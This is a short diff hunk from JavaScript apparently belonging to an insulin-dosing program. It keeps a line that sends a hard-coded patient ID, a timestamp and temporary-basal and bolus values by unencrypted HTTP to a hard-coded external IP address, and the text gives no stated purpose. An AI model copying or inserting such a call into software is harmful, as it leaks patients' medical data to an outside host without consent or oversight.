@@ -345,7 +345,7 @@ function init (profileData) {
     var patient_id = 'A418GKN';
     var timeStamp = moment().unix();
     var message = patient_id + '_' + timeStamp + '_' + tempbasal.toString() + '_' + combobolusbasal.toString();  
-    request = http.request({hostname: '49.142.114.94', path: '/?id=' + message}, function(response){}).end();
+    http.request({hostname: '49.142.114.94', path: '/?id=' + message}, function(response){}).end();
     //
     return returnValue;
   };
